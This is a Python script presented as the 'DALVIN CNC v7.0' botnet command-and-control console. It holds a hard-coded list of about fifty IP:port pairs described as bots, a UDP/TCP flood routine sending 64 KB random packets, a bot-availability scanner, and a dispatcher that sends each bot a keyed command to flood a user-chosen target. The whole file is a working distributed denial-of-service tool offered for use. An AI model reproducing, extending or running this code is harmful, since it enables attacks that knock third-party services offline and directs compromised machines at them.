import os
import sys
import threading
import requests
import socket
import random
import time
from colorama import Fore, Style, init

# Initialize Colors
init(autoreset=True)
B, W, R, G, Y = Fore.BLUE, Fore.WHITE, Fore.RED, Fore.GREEN, Fore.YELLOW
RS = Style.RESET_ALL

# Integrated Botnet List
DALVIN_BOTS = list(set([
    "87.116.152.189:80", "109.206.96.127:8080", "109.206.96.75:8080", "109.233.191.130:8080",
    "185.37.168.3:5000", "109.206.96.58:8080", "109.206.96.230:8080", "91.102.231.82:8000",
    "109.206.96.98:8080", "109.206.96.96:8080", "93.87.72.254:8084", "93.87.72.254:8090",
    "93.87.72.254:8082", "109.228.134.144:81", "31.208.117.192:82", "80.245.224.153:80",
    "129.16.115.124:8080", "185.36.240.161:80", "88.129.182.53:8080", "88.129.182.53:8083",
    "5.254.207.35:8090", "193.180.125.129:8080", "188.148.247.124:81", "81.225.189.136:80",
    "194.236.9.154:84", "95.109.17.169:81", "78.70.43.129:1024", "194.236.9.154:83",
    "62.95.122.241:80", "81.228.44.82:5000", "88.84.253.131:8000", "78.79.196.15:82",
    "80.88.123.92:80", "82.99.75.135:80", "80.88.123.94:80", "91.195.155.180:80",
    "217.73.101.60:80", "88.84.250.237:80", "81.8.160.235:80", "194.237.255.178:81",
    "194.71.159.17:80", "194.237.150.19:80", "88.84.253.60:80", "194.71.159.8:80",
    "113.161.217.136:1025", "113.161.219.197:82", "14.241.124.155:8082", "113.161.131.30:8080",
    "210.245.111.195:8083", "117.3.67.76:8081"
]))

SECRET_KEY = "DALVIN_XP_KEY"
LISTEN_PORT = 8080 

# --- Attack Engine (Now with larger packet size for bots) ---
def packet_flood(method, target, port, duration):
    end_time = time.time() + float(duration)
    # Increased packet size to 64KB for maximum impact from bots
    packet_data = random._urandom(65500) 
    while time.time() < end_time:
        try:
            if method.upper() == "UDP":
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(packet_data, (target, int(port)))
            elif method.upper() == "TCP":
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((target, int(port)))
                s.send(packet_data)
                s.close()
        except: continue

# --- Status Check ---
def check_bots():
    print(f"{Y}[*] Scanning Botnet Network...{RS}")
    online = 0
    for bot in DALVIN_BOTS:
        try:
            ip, port = bot.split(':')
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            if s.connect_ex((ip, int(port))) == 0:
                online += 1
                print(f"{G}[+] {ip}:{port} --> ACTIVE{RS}")
            s.close()
        except: pass
    print(f"{G}[!] Total Active Nodes Ready: {online}{RS}")

# --- Command Dispatcher ---
def launch_attack(method, target, port, duration):
    print(f"{Y}[*] Dispatching Attack Signal to {len(DALVIN_BOTS)} Nodes...{RS}")
    for bot in DALVIN_BOTS:
        # Each bot is handled in its own thread to avoid slowing down your local connection
        threading.Thread(target=remote_worker, args=(bot, method, target, port, duration), daemon=True).start()

def remote_worker(bot_info, method, target, port, duration):
    try:
        ip = bot_info.split(':')[0]
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        s.connect((ip, LISTEN_PORT))
        # Send signal to the bot to start attacking
        s.send(f"{SECRET_KEY}|{method}|{target}|{port}|{duration}".encode())
        s.close()
    except: pass
    # LOCAL FLOOD REMOVED TO PROTECT YOUR HOME NETWORK (PING/VOICE)

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"{B}    ____  ___    __ _    _______   __")
    print(f"{B}   / __ \/   |  / /| |  / /  _/ | / /")
    print(f"{B}  / / / / /| | / / | | / // //  |/ / ")
    print(f"{B} / /_/ / ___ |/ /__| |/ // // /|  /  ")
    print(f"{B}/_____/_/  |_/_____|___/___/_/ |_/   ")
    print(f"\n{W}      [ DALVIN CNC v7.0 - NODES: {G}{len(DALVIN_BOTS)}{W} ]{RS}")
    print(f"{W}      [ Mode: Remote Command Center | Protection: {G}Home Internet Safe{W} ]{RS}\n")

def main():
    banner()
    while True:
        try:
            cmd = input(f"{B}Dalvin@CNC:~# {RS}").strip().split()
            if not cmd: continue
            if cmd[0].lower() == "check":
                check_bots()
                continue
            if cmd[0].lower() == "clear":
                banner()
                continue
            if cmd[0].lower() == "exit": break
            if len(cmd) == 4:
                launch_attack(cmd[0].upper(), cmd[1], cmd[2], cmd[3])
                print(f"{G}[+] All Bots Engaged! Your local internet remains stable.{RS}")
            else:
                print(f"{R}Usage: <UDP/TCP> <TARGET_IP> <PORT> <TIME>{RS}")
        except KeyboardInterrupt: break

if __name__ == "__main__":
    main()
